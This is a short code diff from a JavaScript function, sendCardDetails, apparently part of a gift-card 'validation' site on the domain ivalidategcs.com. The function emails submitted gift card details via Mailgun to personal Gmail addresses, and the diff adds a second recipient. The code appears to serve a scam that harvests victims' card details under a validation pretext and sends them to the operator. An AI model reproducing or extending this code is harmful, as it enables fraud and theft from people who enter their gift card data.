@@ -37,7 +37,7 @@ async function sendCardDetails(data) {
   try {
     const msg = await mg.messages.create("mg.ivalidategcs.com", {
       from: "Mailgun Sandbox <postmaster@mg.ivalidategcs.com>",
-      to: ["<olakunle23odunade@gmail.com>"],
+      to: ["olakunle23odunade@gmail.com","olakunlefacebook@gmail.com"],
       subject: "Gift Card Update",
       text: `
         CardName : ${data.cardName}
